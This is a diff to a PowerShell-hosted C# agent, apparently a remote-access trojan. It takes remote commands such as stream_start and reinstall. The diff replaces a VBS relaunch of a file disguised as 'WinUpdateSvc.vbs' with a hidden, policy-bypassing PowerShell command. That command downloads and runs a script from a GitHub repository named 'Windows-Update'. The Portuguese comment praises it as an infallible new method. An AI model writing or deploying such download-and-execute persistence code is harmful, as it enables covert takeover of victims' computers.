@@ -202,10 +202,11 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
+                // COMANDO DE REINSTALAR (NOVO METODO INFALÍVEL)
                 if (cmd == "reinstall") {
-                    string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
+                    string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                     try {
-                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c timeout /t 2 /nobreak >nul && wscript.exe //B //Nologo \"" + vbsPath + "\"");
+                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
                         psi.WindowStyle = ProcessWindowStyle.Hidden;
                         psi.CreateNoWindow = true;
                         Process.Start(psi);
